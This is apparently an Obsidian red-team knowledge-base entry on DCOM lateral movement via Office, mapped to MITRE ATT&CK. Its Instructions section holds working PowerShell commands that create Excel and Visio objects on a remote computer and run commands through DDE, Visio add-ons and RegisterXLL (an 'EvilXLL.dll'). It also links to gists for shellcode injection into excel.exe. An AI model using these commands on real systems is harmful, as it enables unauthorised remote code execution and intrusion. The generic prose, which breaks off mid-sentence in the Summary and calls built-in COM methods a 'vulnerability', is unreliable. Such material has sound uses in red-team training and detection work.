---
id: a04d578a-03bb-45b5-a33b-7d437d19f7a7
name: DCOM Office Remote Code Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.129945+00:00'
updated_at: '2023-04-10T20:26:31.998441+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Office Application Startup|T1137 - Office Application Startup]]'
- '[[Remote Services|T1021 - Remote Services]]'
sub_techniques:
- '[[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
tags:
- '[[Active Directory Attacks]]'
- '[[DCOM Exploitation]]'
- '[[DCOM via Office]]'
commands:
- '[[Inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM]]'
- '[[Invoke ExShellcode]]'
- '[[Using Excel DDE]]'
- '[[Using Excel RegisterXLL]]'
- '[[Using Visio]]'
---

# DCOM Office Remote Code Execution

## Summary

DCOM Office Remote Code Execution is an attack that leverages DCOM to execute arbitrary code on a remote system via Office applications. The attacker first establishes a foothold on the network and then exploits the DCOM vulnerability to remotely execute code on a target system. This attack can be 

## Description

# Description

DCOM Office Remote Code Execution is an attack that leverages DCOM to execute arbitrary code on a remote system via Office applications. The attacker first establishes a foothold on the network and then exploits the DCOM vulnerability to remotely execute code on a target system. This attack can be used to move laterally across the network and gain access to sensitive information. Technical details of this attack include exploiting a vulnerability in DCOM to execute arbitrary code on a remote system via Office applications. The business value of this attack is that it allows an attacker to gain access to sensitive data and move laterally across the network.

 

## Requirements

1. Access to the network

1. Exploitable DCOM vulnerability

1. Office applications installed on target system

 

## Defense

1. Disable DCOM if not required

1. Limit DCOM permissions to only trusted users and systems

1. Monitor network for unusual DCOM activity

 

## Objectives

1. Execute arbitrary code on a remote system

1. Move laterally across the network

1. Gain access to sensitive information

 

# Instructions

1. The provided PowerShell script can be used to execute arbitrary code on a remote machine via Office applications. It uses various techniques such as DCOM, Excel DDE, Excel RegisterXLL, and Visio to execute the code.

 



**Code**: [[# Powershell script that injects shellcode into ex]]



> The script can be used to inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM. It can also be used to execute commands via Excel DDE and Visio. Additionally, it can register an XLL file with Excel and execute code via it. However, this technique cannot be used reliably with a remote target. The PowerShell script also requires the Trusted Locations registry key to be added for Excel RegisterXLL technique to work.



**Command** ([[Inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM]]):

```bash
https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
```





**Command** ([[Invoke ExShellcode]]):

```bash
https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a
```





**Command** ([[Using Excel DDE]]):

```bash
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate(\"cmd\", \"/c calc.exe\")
```





**Command** ([[Using Excel RegisterXLL]]):

```bash
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))
$excel.RegisterXLL(\"EvilXLL.dll\")
```





**Command** ([[Using Visio]]):

```bash
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))
$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Office Application Startup|T1137 - Office Application Startup]]
- [[Remote Services|T1021 - Remote Services]]

### Sub-Techniques

- [[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]

## Commands Used

- [[Inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM]]
- [[Invoke ExShellcode]]
- [[Using Excel DDE]]
- [[Using Excel RegisterXLL]]
- [[Using Visio]]

## Tags

- [[Active Directory Attacks]]
- [[DCOM Exploitation]]
- [[DCOM via Office]]


